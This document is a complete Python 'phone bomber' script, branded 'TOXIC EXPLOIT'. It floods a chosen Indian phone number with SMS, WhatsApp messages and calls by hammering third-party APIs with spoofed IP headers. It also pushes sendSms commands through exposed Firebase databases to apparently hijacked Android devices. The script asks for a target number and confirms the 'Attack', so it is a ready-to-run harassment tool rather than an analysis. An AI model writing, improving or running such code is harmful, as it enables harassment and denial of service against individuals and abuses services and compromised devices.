#!/usr/bin/env python3
"""
💀 ULTIMATE PHONE BOMBER v16.0
- Branding + Credits (encrypted)
- Firebase SUCCESS count
- sent_log.jsonl
"""
import asyncio
import aiohttp
import time
import random
import sys
import json
import base64
import signal
from datetime import datetime
from pathlib import Path

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
    from colorama import Fore, Style, init
    init(autoreset=True)

# ═══════════════════════════════════════════════════════════
# 🔐 ENCRYPTED CREDITS (Base64)
# ═══════════════════════════════════════════════════════════
_TG = "aHR0cHM6Ly90Lm1lL2JvdGFkbWluc2hlcmU="
_YT = "aHR0cHM6Ly95b3V0dWJlLmNvbS9AdG94aWNleHBsb2l0"
_TG_NAME = "Ym90YWRtaW5zaGVyZQ=="
_YT_NAME = "dG94aWNleHBsb2l0"


def _d(s):
    """Decode base64"""
    try:
        return base64.b64decode(s).decode("utf-8")
    except:
        return ""


CREDIT_TG = _d(_TG)
CREDIT_YT = _d(_YT)
CREDIT_TG_NAME = _d(_TG_NAME)
CREDIT_YT_NAME = _d(_YT_NAME)


def show_banner():
    """Display branding banner"""
    print(f"\n{Fore.CYAN}{'╔' + '═'*68 + '╗'}")
    print(f"║{'💀 ULTIMATE PHONE BOMBER v16.0 💀':^68}║")
    print(f"╠{'═'*68}╣")
    print(f"║{'📢 CREDITS & SUPPORT':^68}║")
    print(f"║{' '*68}║")
    print(f"║  🔗 Telegram : {Fore.YELLOW}{CREDIT_TG:<51}{Fore.CYAN}║")
    print(f"║  📺 YouTube  : {Fore.RED}{CREDIT_YT:<51}{Fore.CYAN}║")
    print(f"║{' '*68}║")
    print(f"║{'  💀 Powered by TOXIC EXPLOIT 💀':^68}║")
    print(f"╚{'═'*68}╝{Style.RESET_ALL}\n")


def show_footer():
    """Display footer credits"""
    print(f"\n{Fore.CYAN}{'═'*68}")
    print(f"{'  🔗 Telegram : ' + CREDIT_TG:^68}")
    print(f"{'  📺 YouTube  : ' + CREDIT_YT:^68}")
    print(f"{'  💀 TOXIC EXPLOIT 💀':^68}")
    print(f"{'═'*68}{Style.RESET_ALL}\n")


def show_credit_inline():
    """Small credit line for spam"""
    return (
        f"{Fore.MAGENTA}🔗 {CREDIT_TG_NAME} "
        f"{Fore.RED}| 📺 {CREDIT_YT_NAME}{Style.RESET_ALL}"
    )


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════
BASE_DIR = Path(__file__).parent
API_FILE = BASE_DIR / "api.txt"
FIREBASE_FILE = BASE_DIR / "firebases.txt"
LOG_FILE = BASE_DIR / "sent_log.jsonl"

TIMEOUT = 8
DELAY = 0.01
FB_DELAY = 0.03

session_holder = {"session": None}


# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════
def clean_print(msg):
    sys.stdout.write("\r" + " " * 100 + "\r")
    sys.stdout.write(msg + "\n")
    sys.stdout.flush()


def log_entry(entry: dict):
    try:
        with LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    except:
        pass


def load_apis(path):
    if not path.exists():
        return []
    apis = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("|")
        if len(parts) < 3:
            continue
        name, url, method = parts[0].strip(), parts[1].strip(), parts[2].strip().upper()
        data = parts[3].strip() if len(parts) > 3 else None
        if not url.startswith(("http://", "https://")):
            continue
        apis.append({"name": name, "url": url, "method": method, "data": data})
    return apis


def load_firebases(path):
    if not path.exists():
        return []
    fbs, seen = [], set()
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "|" in line:
            _, url = (x.strip() for x in line.split("|", 1))
        else:
            url = line
        if not url.startswith(("http://", "https://")):
            continue
        url = url.rstrip("/")
        if url in seen:
            continue
        seen.add(url)
        fbs.append(url)
    return fbs


def is_online(dev):
    if not isinstance(dev, dict):
        return False
    return any([
        dev.get("isOnline"),
        dev.get("online"),
        dev.get("connected"),
        dev.get("is_online"),
        dev.get("live"),
        dev.get("status") in ("online", "active", "connected", True, 1, "1"),
    ])


def read_log_tail(n=10):
    if not LOG_FILE.exists():
        return []
    lines = LOG_FILE.read_text(encoding="utf-8").splitlines()
    out = []
    for line in lines[-n:]:
        try:
            out.append(json.loads(line))
        except:
            pass
    return out


# ═══════════════════════════════════════════════════════════
# BOMBER
# ═══════════════════════════════════════════════════════════
class UltimateBomber:
    def __init__(self, phone, apis, firebases, api_limit=0, fb_limit=0, custom_msg=""):
        self.phone = phone
        self.apis = apis
        self.firebases = firebases
        self.api_limit = api_limit
        self.fb_limit = fb_limit
        self.custom_msg = custom_msg
        self.running = True
        self.stats = {
            "api_total": 0, "api_success": 0, "api_failed": 0,
            "calls": 0, "whatsapp": 0, "sms": 0,
            "fb_total": 0, "fb_success": 0, "fb_failed": 0,
            "fb_no_device": 0, "fb_offline_skipped": 0, "fb_scanned": 0,
            "start": time.time(),
        }
        self.api_lock = asyncio.Lock()
        self.fb_success_lock = asyncio.Lock()
        self.fb_index = 0
        self.fb_index_lock = asyncio.Lock()

    def _classify(self, name):
        n = name.lower()
        if "call" in n or "voice" in n:
            return ("CALL", "📞")
        elif "whatsapp" in n:
            return ("WHATSAPP", "📱")
        return ("SMS", "💬")

    async def hit_api(self, session, api):
        while self.running:
            async with self.api_lock:
                if self.stats["api_total"] >= self.api_limit:
                    return
                self.stats["api_total"] += 1
                current = self.stats["api_total"]
            try:
                name = api["name"]
                url = api["url"].replace("{phone}", self.phone)
                method = api["method"]
                data = api["data"].replace("{phone}", self.phone) if api["data"] else None
                headers = {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                }
                if data and data.strip().startswith(("{", "[")):
                    headers["Content-Type"] = "application/json"
                elif data:
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                atype, emoji = self._classify(name)
                if atype == "CALL":
                    self.stats["calls"] += 1
                elif atype == "WHATSAPP":
                    self.stats["whatsapp"] += 1
                else:
                    self.stats["sms"] += 1

                success = False
                status_code = 0
                try:
                    if method == "POST":
                        async with session.post(url, headers=headers, data=data,
                            timeout=aiohttp.ClientTimeout(total=TIMEOUT), ssl=False) as r:
                            status_code = r.status
                            success = r.status in (200, 201, 202, 204)
                    else:
                        async with session.get(url, headers=headers,
                            timeout=aiohttp.ClientTimeout(total=TIMEOUT), ssl=False) as r:
                            status_code = r.status
                            success = r.status in (200, 201, 202, 204)
                except:
                    pass

                if success:
                    self.stats["api_success"] += 1
                    clean_print(f"{Fore.RED}{emoji} {name[:26]:<26} ✅ {status_code} [{current}/{self.api_limit}]")
                else:
                    self.stats["api_failed"] += 1

                log_entry({
                    "ts": int(time.time()),
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "type": "API",
                    "name": name,
                    "url": url[:100],
                    "target": f"+91{self.phone}",
                    "message": "",
                    "status": status_code,
                    "success": success,
                    "index": current,
                })

                await asyncio.sleep(DELAY)
            except:
                continue

    async def get_next_firebase(self):
        async with self.fb_index_lock:
            if not self.firebases:
                return None
            fb = self.firebases[self.fb_index % len(self.firebases)]
            self.fb_index += 1
            return fb

    async def scan_online_devices(self, session, fb_url):
        url = f"{fb_url}/clients.json"
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=TIMEOUT), ssl=False) as r:
                if r.status != 200:
                    return []
                try:
                    data = await r.json()
                except:
                    return []
                if not isinstance(data, dict):
                    return []
                return [dev_id for dev_id, dev in data.items() if is_online(dev)]
        except:
            return []

    async def send_fb_sms(self, session, fb_url, dev_id, message):
        sms_url = f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms.json"
        payload = {
            "from": 0,
            "to": f"+91{self.phone}",
            "message": message,
            "isSended": False,
            "timestamp": int(time.time()),
        }
        try:
            async with session.put(sms_url, json=payload,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT), ssl=False) as sr:
                return sr.status, 200 <= sr.status < 300
        except:
            return 0, False

    async def try_one_firebase(self, session, fb_url):
        async with self.fb_success_lock:
            if self.stats["fb_success"] >= self.fb_limit:
                return 0

        self.stats["fb_scanned"] += 1
        devices = await self.scan_online_devices(session, fb_url)
        if not devices:
            self.stats["fb_offline_skipped"] += 1
            return 0

        short = fb_url.split("//")[-1][:22]
        successes = 0
        for dev_id in devices:
            async with self.fb_success_lock:
                if self.stats["fb_success"] >= self.fb_limit:
                    return successes

            self.stats["fb_total"] += 1
            status, ok = await self.send_fb_sms(session, fb_url, dev_id, self.custom_msg)
            if ok:
                async with self.fb_success_lock:
                    self.stats["fb_success"] += 1
                    current = self.stats["fb_success"]
                successes += 1
                clean_print(
                    f"{Fore.CYAN}🎨 FB: {short:<20} "
                    f"📩 '{self.custom_msg[:12]}' "
                    f"✅ [{current}/{self.fb_limit}] "
                    f"(scan:{self.stats['fb_scanned']})"
                )
            else:
                self.stats["fb_failed"] += 1

            log_entry({
                "ts": int(time.time()),
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": "FIREBASE",
                "name": short,
                "firebase": fb_url[:100],
                "device_id": dev_id[:50],
                "target": f"+91{self.phone}",
                "message": self.custom_msg,
                "status": status,
                "success": ok,
                "fb_success_count": self.stats["fb_success"],
            })

        return successes

    async def hit_firebase(self):
        while self.running:
            async with self.fb_success_lock:
                if self.stats["fb_success"] >= self.fb_limit:
                    return

            fb_url = await self.get_next_firebase()
            if not fb_url:
                return

            await self.try_one_firebase(session_holder["session"], fb_url)
            await asyncio.sleep(FB_DELAY)

    async def start(self):
        print(f"\n{Fore.RED}{'═'*70}")
        print(f"{'💀 ULTIMATE BOMBER v16.0 💀':^70}")
        print(f"{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🎯 Target: +91{self.phone}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 API   : {self.api_limit}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎨 FB    : {self.fb_limit} SUCCESS target{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📩 Msg   : '{self.custom_msg}'{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📝 Log   : {LOG_FILE.name}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}📢 {CREDIT_TG}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}📺 {CREDIT_YT}{Style.RESET_ALL}")
        print(f"{Fore.RED}🚀 Starting...{Style.RESET_ALL}\n")

        import threading
        def stats_loop():
            last = 0
            while self.running:
                now = time.time()
                if now - last >= 3:
                    last = now
                    el = now - self.stats["start"]
                    s = self.stats
                    clean_print(
                        f"{Fore.CYAN}[{el:.0f}s] "
                        f"{Fore.RED}API {s['api_success']}/{self.api_limit}  "
                        f"{Fore.CYAN}FB {s['fb_success']}/{self.fb_limit} "
                        f"{Fore.MAGENTA}(scan:{s['fb_scanned']} skip:{s['fb_offline_skipped']})"
                    )
                time.sleep(1)
        threading.Thread(target=stats_loop, daemon=True).start()

        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            session_holder["session"] = session
            tasks = []
            if self.api_limit > 0:
                for api in self.apis:
                    tasks.append(asyncio.create_task(self.hit_api(session, api)))
            if self.fb_limit > 0:
                for _ in range(min(10, self.fb_limit)):
                    tasks.append(asyncio.create_task(self.hit_firebase()))
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)

        self.running = False
        print(f"\n{Fore.GREEN}✅ All targets completed!{Style.RESET_ALL}")


# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════
def ask_int(prompt, default=0, min_val=0, max_val=999999):
    while True:
        try:
            val = input(f"{Fore.YELLOW}{prompt} [{default}]: {Style.RESET_ALL}").strip()
            if not val:
                return default
            n = int(val)
            if n < min_val or n > max_val:
                print(f"{Fore.RED}   ❌ Range: {min_val} - {max_val}{Style.RESET_ALL}")
                continue
            return n
        except ValueError:
            print(f"{Fore.RED}   ❌ Number daalo!{Style.RESET_ALL}")


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════
def main():
    def sig_handler(sig, frame):
        print(f"\n\n{Fore.RED}🛑 Stopped!{Style.RESET_ALL}")
        show_footer()
        sys.exit(0)
    signal.signal(signal.SIGINT, sig_handler)

    show_banner()

    api_list = load_apis(API_FILE)
    fb_list = load_firebases(FIREBASE_FILE)

    print(f"{Fore.CYAN}📦 Loaded Files:{Style.RESET_ALL}")
    print(f"  🌐 api.txt       : {len(api_list)} APIs")
    print(f"  🔥 firebases.txt : {len(fb_list)} Firebases")
    print(f"  📝 sent_log.jsonl: {'Exists' if LOG_FILE.exists() else 'New file'}")

    if not api_list and not fb_list:
        print(f"\n{Fore.RED}❌ Koi file nahi mili!{Style.RESET_ALL}")
        return

    # STEP 1: TOTAL
    print(f"\n{Fore.CYAN}{'═'*60}")
    print(f"{'📊 STEP 1: TOTAL MESSAGES':^60}")
    print(f"{'═'*60}{Style.RESET_ALL}")
    total = ask_int("Total kitne messages", default=50, min_val=1, max_val=999999)
    print(f"{Fore.GREEN}✅ Total: {total}{Style.RESET_ALL}")

    # STEP 2: API
    print(f"\n{Fore.CYAN}{'═'*60}")
    print(f"{'🌐 STEP 2: API SE KITNE?':^60}")
    print(f"{'═'*60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Available: {len(api_list)} APIs{Style.RESET_ALL}")
    api_max = min(total, len(api_list))
    api_limit = ask_int("API se kitne", default=api_max, min_val=0, max_val=api_max)
    print(f"{Fore.GREEN}✅ API: {api_limit}{Style.RESET_ALL}")

    # STEP 3: FIREBASE
    remaining = total - api_limit
    print(f"\n{Fore.CYAN}{'═'*60}")
    print(f"{'🔥 STEP 3: FIREBASE SE KITNE?':^60}")
    print(f"{'═'*60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Bacha: {remaining} (SUCCESS count){Style.RESET_ALL}")
    if remaining > 0:
        fb_limit = ask_int("Firebase success", default=remaining, min_val=0, max_val=999999)
    else:
        fb_limit = 0
    print(f"{Fore.GREEN}✅ Firebase: {fb_limit}{Style.RESET_ALL}")

    # STEP 4: MESSAGE
    print(f"\n{Fore.CYAN}{'═'*60}")
    print(f"{'📩 STEP 4: CUSTOM MESSAGE':^60}")
    print(f"{'═'*60}{Style.RESET_ALL}")
    custom_msg = input(f"{Fore.GREEN}Message: {Style.RESET_ALL}").strip() or "Hello"
    print(f"{Fore.GREEN}✅ '{custom_msg}'{Style.RESET_ALL}")

    # STEP 5: NUMBER
    print(f"\n{Fore.CYAN}{'═'*60}")
    print(f"{'🎯 STEP 5: TARGET NUMBER':^60}")
    print(f"{'═'*60}{Style.RESET_ALL}")
    phone = input(f"{Fore.GREEN}Number: {Style.RESET_ALL}").strip()
    phone = "".join(filter(str.isdigit, phone))[-10:]
    if len(phone) != 10:
        print(f"{Fore.RED}❌ Invalid!{Style.RESET_ALL}")
        return
    print(f"{Fore.GREEN}✅ +91{phone}{Style.RESET_ALL}")

    # SUMMARY
    print(f"\n{Fore.CYAN}╔{'═'*58}╗")
    print(f"║{'📊 SUMMARY':^58}║")
    print(f"╠{'═'*58}╣")
    print(f"║  🎯 +91{phone:<48}║")
    print(f"║  📊 Total      : {total:<32}║")
    print(f"║  🌐 API        : {api_limit:<32}║")
    print(f"║  🔥 Firebase   : {fb_limit:<32}║")
    print(f"║  📩 Message    : {custom_msg[:30]:<32}║")
    print(f"╚{'═'*58}╝{Style.RESET_ALL}")

    # CONFIRM
    print(f"\n{Fore.MAGENTA}📢 {CREDIT_TG}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}📺 {CREDIT_YT}{Style.RESET_ALL}\n")

    if input(f"{Fore.RED}💀 Attack? (y/n): {Style.RESET_ALL}").strip().lower() != "y":
        return

    for i in range(3, 0, -1):
        print(f"{Fore.RED}⏰ {i}...{Style.RESET_ALL}")
        time.sleep(1)

    bomber = UltimateBomber(phone, api_list, fb_list, api_limit, fb_limit, custom_msg)
    try:
        asyncio.run(bomber.start())
    except KeyboardInterrupt:
        bomber.running = False

    # FINAL REPORT
    el = time.time() - bomber.stats["start"]
    print(f"\n{Fore.CYAN}{'═'*58}")
    print(f"{'📊 FINAL REPORT':^58}")
    print(f"{'═'*58}{Style.RESET_ALL}")
    print(f"  📞 Calls            : {bomber.stats['calls']}")
    print(f"  📱 WhatsApp         : {bomber.stats['whatsapp']}")
    print(f"  💬 SMS              : {bomber.stats['sms']}")
    print(f"  ✅ API Success      : {bomber.stats['api_success']}")
    print(f"  ❌ API Failed       : {bomber.stats['api_failed']}")
    print(f"  🔥 FB Success       : {bomber.stats['fb_success']}")
    print(f"  ❌ FB Failed        : {bomber.stats['fb_failed']}")
    print(f"  📊 FB Scanned       : {bomber.stats['fb_scanned']}")
    print(f"  ⚠️  FB Skip          : {bomber.stats['fb_offline_skipped']}")
    print(f"  ⏱  Time             : {el:.1f}s")
    print(f"  📝 Log              : {LOG_FILE.name}")
    print(f"{Fore.CYAN}{'═'*58}{Style.RESET_ALL}")

    # SHOW LOG
    print(f"\n{Fore.CYAN}📝 Last 10 log entries:{Style.RESET_ALL}")
    entries = read_log_tail(10)
    if not entries:
        print(f"{Fore.YELLOW}  (Koi log nahi){Style.RESET_ALL}")
    else:
        print(f"  {'TIME':<20} {'TYPE':<10} {'TARGET':<16} {'STATUS':<8}")
        print(f"  {'-'*58}")
        for e in entries:
            mark = "✅" if e.get("success") else "❌"
            print(f"  {e.get('time',''):<20} {e.get('type',''):<10} {e.get('target',''):<16} {mark} {e.get('status','')}")

    # FOOTER CREDITS
    show_footer()


if __name__ == "__main__":
    main()